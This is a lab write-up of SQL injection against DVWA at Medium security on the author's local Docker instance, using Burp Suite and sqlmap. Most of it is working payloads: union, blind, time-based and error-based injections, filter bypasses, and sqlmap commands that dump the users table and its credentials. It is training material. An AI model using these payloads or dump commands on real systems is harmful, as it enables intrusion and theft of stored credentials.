# DVWA Medium Level



## DVWA Testing Medium Level


- In this i used `DVWA` in my `loacal Machine` in my `Docker` and use `Burp Suite` in my kali: http://192.168.100.97:8080/
- In my target i set it to `Medium Level`:
<img width="1012" height="927" alt="image" src="https://github.com/user-attachments/assets/893dc62f-a906-4cef-9539-9a85e2b0bb7b" />

- And now in my `SQL Injection`  i can choose `number` in list like:
<img width="1013" height="908" alt="image" src="https://github.com/user-attachments/assets/2c3ee0cb-7c93-4b7d-88da-62f2dfdd514f" />

<img width="1012" height="703" alt="image" src="https://github.com/user-attachments/assets/192e172d-d658-4234-b0e5-a04fa125bf67" />


## Use with Burp Suite
- First i need to open my `Burp Suite`:
<img width="1919" height="1065" alt="image" src="https://github.com/user-attachments/assets/43a01bb8-b383-4912-83d3-37579cba223e" />

- So in this after i login with my `Credentials` go back to our `SQL Injection` and then it this i can choose `number`, also if i choose `1`:
<img width="866" height="852" alt="image" src="https://github.com/user-attachments/assets/21dba26d-bb14-4106-a5c3-05de3f2e358d" />

<img width="803" height="537" alt="image" src="https://github.com/user-attachments/assets/b1933bd5-e6d9-4720-a112-78eeba377b4a" />

- And after go to back our `Burp Suite` we will see this:
<img width="1919" height="848" alt="image" src="https://github.com/user-attachments/assets/d8953726-f308-4a41-be65-67d050243400" />

- After this `Right` click on it and select `Send to Repeater`:
<img width="1918" height="900" alt="image" src="https://github.com/user-attachments/assets/d185474b-2538-4a38-b7c9-801ccb0d0960" />

- And then go to `Repeater` also in these we can chenge to something:
<img width="1199" height="562" alt="image" src="https://github.com/user-attachments/assets/01306777-4a7f-49c0-b42f-11fe40d7b94e" />

- Like i want to change payload in this:
<img width="1580" height="788" alt="image" src="https://github.com/user-attachments/assets/7eab3b3c-971d-43bf-a769-8f013bddce9a" />

<img width="1540" height="742" alt="image" src="https://github.com/user-attachments/assets/55ec73d2-81e5-466b-ad90-24ac696fccb2" />

- we see this is the same between in `browser` and in `Burp Suite`.

- And what about if i input `Wrong payload` like if i input `' ` what happen?
<img width="1576" height="521" alt="image" src="https://github.com/user-attachments/assets/47eae981-8e8f-46a3-bf2c-a226ba128ef0" />

- In this we see what Different between `Correct Payload` and `Wrong Payload`.


## Use These Payloads and encode
### Numeric-Based Payloads (No Quotes Needed)
````
1 OR 1=1 # 
1 UNION SELECT 1,@@version
1 UNION SELECT user(),database()
1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
````
<img width="1918" height="602" alt="image" src="https://github.com/user-attachments/assets/94fa5681-69cd-41f5-8f03-8d9d109e41a6" />

<img width="786" height="372" alt="image" src="https://github.com/user-attachments/assets/c47c8976-c0e5-4d67-bd47-6800cd53b9ec" />

- After select on `1 OR 1=1 # ` Press `Ctrl + U`, after it `encode` click on `Send`:
<img width="1915" height="592" alt="image" src="https://github.com/user-attachments/assets/916efd50-0566-4047-a7cc-09efa72cbbd9" />

- It show this so this mean we input the `Correct Payload`:
<img width="1915" height="818" alt="image" src="https://github.com/user-attachments/assets/57e55a49-b2c8-4ae5-9c18-585c06e42448" />

<img width="1918" height="815" alt="image" src="https://github.com/user-attachments/assets/42868dad-8502-4803-b557-c54cf8a1eab1" />

- So this our `Result`.
---

- Payload: `1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()`
<img width="1917" height="781" alt="image" src="https://github.com/user-attachments/assets/04e0a65d-e3eb-4ecc-bea4-a67e8a13b3d1" />

- After select on it Press `Ctrl + U` and click on `Send`:
<img width="1917" height="793" alt="image" src="https://github.com/user-attachments/assets/7a52a118-6f65-47f1-aff3-572a6b2c48b2" />

<img width="1578" height="785" alt="image" src="https://github.com/user-attachments/assets/c02a2bfd-1845-4db2-8a33-be4132b60bd2" />



## Exploitation Chain

### Determine Column Count
````
1 ORDER BY 1
1 ORDER BY 2
1 ORDER BY 3
````
- Payload: 1 ORDER BY 1
<img width="1907" height="765" alt="image" src="https://github.com/user-attachments/assets/83476146-361e-4304-a464-9c011f28733c" />



### Test Union Injection
````
1 UNION SELECT 1,2
````
<img width="1916" height="812" alt="image" src="https://github.com/user-attachments/assets/658466ed-fe9e-43d5-af98-fb14fe0a6239" />



### Extract Database Information
````
1 UNION SELECT @@version, @@hostname
1 UNION SELECT user(), database()
1 UNION SELECT @@datadir, @@basedir
````
- Payload: `1 UNION SELECT @@version, @@hostname`
<img width="1912" height="766" alt="image" src="https://github.com/user-attachments/assets/bafd740b-af1c-4f7a-bc1d-b8976d87ff50" />



### Extract Table Names
````
1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
````
<img width="1918" height="760" alt="image" src="https://github.com/user-attachments/assets/adf51e27-c9fc-4fa4-9a0b-c1e975a77983" />


###  Extract User Credentials
````
1 UNION SELECT user, password FROM users
1 UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users
1 UNION SELECT CONCAT(user,':',password), '2' FROM users
````
<img width="1912" height="732" alt="image" src="https://github.com/user-attachments/assets/40c38333-6748-4440-9a8c-8787a4bded51" />


---


# SQLMap Techniques for Medium Security

## Check target `Cookie`:
- Use `Burp Suite` to check:
<img width="1922" height="843" alt="image" src="https://github.com/user-attachments/assets/77e229df-5c05-4d27-9e71-6b924daa271d" />


- Or direct in website and `right` click on it and select `Inspect`:
<img width="900" height="720" alt="image" src="https://github.com/user-attachments/assets/a52eb928-2d75-4a54-823d-581323f2b51b" />

<img width="1918" height="817" alt="image" src="https://github.com/user-attachments/assets/bea03163-8db2-4300-b89d-66c9c25edf2f" />

<img width="1916" height="666" alt="image" src="https://github.com/user-attachments/assets/785699b0-2ed8-4bce-83a9-b5c4392c900f" />

- In this we see between `Burp Suite` and check direct in `Website` has the same `cookie`:
<img width="1906" height="860" alt="image" src="https://github.com/user-attachments/assets/4b908e7b-7a22-4e2c-942c-21a21aaa2634" />

- So in this i found Cookie: `r9iao66fu13hdjrtcilhta2fi0`

- Or if i we don't want to test with `Burp Suite` -> `Browser` like `FireFox`:
<img width="1922" height="901" alt="image" src="https://github.com/user-attachments/assets/fc6270ea-5ee0-46b2-88a5-d7b9c6369045" />

- Cookie will be different, but we can use it.
---


## Direct SQLMap with Data Parameter

### Basic detection
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=r9iao66fu13hdjrtcilhta2fi0; security=medium" --batch
````
<img width="1622" height="702" alt="image" src="https://github.com/user-attachments/assets/c5e62f2f-f091-4d2b-8396-b61951d2d7fd" />


### Full database enumeration
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=r9iao66fu13hdjrtcilhta2fi0; security=medium" --dbms=mysql --level=3 --risk=2 --batch
````
<img width="1623" height="727" alt="image" src="https://github.com/user-attachments/assets/037c5ed5-37c7-4bd8-8692-8daff704a91d" />


- In this we see very details, But hard to view.
## Using Request Files

### Create request file
````
sudo mousepad dvwa_medium.req
````
````
POST /vulnerabilities/sqli/ HTTP/1.1
Host: 192.168.100.97:8080
Cookie: PHPSESSID=r9iao66fu13hdjrtcilhta2fi0; security=medium
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

id=1&Submit=Submit
````
<img width="295" height="118" alt="image" src="https://github.com/user-attachments/assets/336c5144-2e97-4adc-aa57-37fbd6b108fe" />


### Use with SQLMap
````
sqlmap -r dvwa_medium.req --batch
````
<img width="1627" height="702" alt="image" src="https://github.com/user-attachments/assets/b2012435-0c66-412e-8ded-da11bdb74103" />


### Complete database dump
````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=r9iao66fu13hdjrtcilhta2fi0; security=medium" --dbs --tables --columns --dump --batch
````
<img width="1415" height="655" alt="image" src="https://github.com/user-attachments/assets/30080f9f-8ac2-4047-8954-fa3c91093d78" />

<img width="531" height="759" alt="image" src="https://github.com/user-attachments/assets/5f8ae54d-7b2a-45a5-8b01-def6854a9595" />

<img width="1028" height="705" alt="image" src="https://github.com/user-attachments/assets/07d3da95-9448-42a1-b6c9-1689467f892d" />

<img width="1437" height="461" alt="image" src="https://github.com/user-attachments/assets/1efe014e-477d-4e23-b1d7-03f5a02e7314" />

- All of thase `Username` and `Password` we can login like:
<img width="1425" height="156" alt="image" src="https://github.com/user-attachments/assets/9aefe20d-53f7-4b85-960a-7278a473c6b4" />

<img width="913" height="636" alt="image" src="https://github.com/user-attachments/assets/f5ceb928-a15f-4483-b76b-fa6d1fbf21f9" />

- So in this we `Successful` to login.

---



## Advanced Exploitation Techniques

- In this we use this in `Burp Suite`:

### Boolean-Based Blind SQL Injection
````
1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
1 AND (SELECT COUNT(*) FROM users)>0
1 AND (SELECT user FROM users LIMIT 0,1)='admin'
````
- Payload: `1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100 `
<img width="1913" height="747" alt="image" src="https://github.com/user-attachments/assets/2a449cdc-a443-4e69-85de-080c2922202c" />

- Payload: `1 AND (SELECT COUNT(*) FROM users)>0 `
<img width="1580" height="807" alt="image" src="https://github.com/user-attachments/assets/804f4ab1-2150-42b0-b6ef-1b42c0a2231b" />

  - `1`:	A valid value (e.g., part of a condition like id=1).
  - `AND`:	Combines another condition to the original SQL query.
  - `(SELECT COUNT(*) FROM users)`:	A subquery that counts how many rows exist in the users table.
  - `>0`: Returns TRUE if the count is greater than zero (meaning the table exists and has data).

- Payload: ``1 AND (SELECT user FROM users LIMIT 0,1)='admin' ``
<img width="1581" height="462" alt="image" src="https://github.com/user-attachments/assets/761e2c58-23a7-4ccf-bdaf-a443041b8a79" />

  - ``But this``: `Payload` not work.
  - `(`:	Opens the subquery (starts a nested SELECT).
  - `SELECT user`:	Selects the user column from the target table (returns a single value).
  - `FROM users`:	Specifies the table users as the source of the selected column.
  - `LIMIT 0,1`:	Restricts the subquery result to the first row only (offset 0, count 1).
  - `)`:	Closes the subquery.
  - `='admin'`:	Compares the subqueryâ€™s returned value to the string 'admin'; the whole condition is TRUE if they match.


### Time-Based Blind SQL Injection
````
1 AND IF(ASCII(SUBSTRING(database(),1,1))=100,SLEEP(5),0)
1 AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)
````

### Error-Based Extraction
````
1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT database())))
1 AND UPDATEXML(1,CONCAT(0x3a,(SELECT user())),1)
````

- In this i don't show demo cause it the same above.

---


## Bypass Techniques for Medium Security

### Numeric Bypass
````
1 OR 1=1 UNION SELECT 1,2--
````
<img width="1882" height="736" alt="image" src="https://github.com/user-attachments/assets/43b0e041-3dba-4aa3-b495-749f8d8f8fc2" />

- Since medium security uses dropdown with numbers, we can directly inject.


### Encoding Bypass
````
1%20OR%201=1
1%20UNION%20SELECT%201,2
````
- Payload: `1%20OR%201=1`
<img width="1572" height="780" alt="image" src="https://github.com/user-attachments/assets/53253877-b6d5-429d-a3a2-0b5ca7aab70e" />

- Payload: `1%20UNION%20SELECT%201,2`
<img width="1577" height="726" alt="image" src="https://github.com/user-attachments/assets/86539997-e695-437b-84d0-0f4196407c30" />

- Also if we want to see like in browser:
<img width="1577" height="852" alt="image" src="https://github.com/user-attachments/assets/5d8bb3c9-6e26-49c7-95f2-1cff83caf92e" />

### Case Variation
````
1 Or 1=1
1 uNIoN sEleCt 1,2
````
- Payload: `1 Or 1=1 `
<img width="1559" height="755" alt="image" src="https://github.com/user-attachments/assets/c9091261-a680-4f82-ab51-42a472dbd5e6" />

 - Also we can use direct `payload` no `Encode`.

---


## SQLMap Advanced Commands

### Comprehensive Database Dump

````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=r9iao66fu13hdjrtcilhta2fi0; security=medium" -D dvwa --dump-all --batch
````
<img width="1890" height="668" alt="image" src="https://github.com/user-attachments/assets/bf25afec-c5f4-4b31-a825-ac4fbda74149" />

<img width="1277" height="722" alt="image" src="https://github.com/user-attachments/assets/7c02f8b6-5fd4-4ebf-9c5c-036a1cf1136d" />

- In this we can `dump` to find fast `Username` and `Password`, only we know name of `database` to find tables`Users` and tables `guesbook`.



````
sqlmap -u "http://192.168.100.97:8080/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=r9iao66fu13hdjrtcilhta2fi0; security=medium" -D dvwa -T users --dump --batch
````
<img width="1617" height="565" alt="image" src="https://github.com/user-attachments/assets/cbf54f67-999a-4c47-b165-02eeee2a7e68" />

<img width="1292" height="508" alt="image" src="https://github.com/user-attachments/assets/2a378b7e-3f08-44a7-8a6f-b44e5e3ad4a2" />

- In this we find only  table `Users`.

-----


---

## Finished of DVWA Medium for SQL Injection

---


----
## Practice In LAB BY: Nin Kanong (k4n0ng)

### Date: 26/10/2025

----
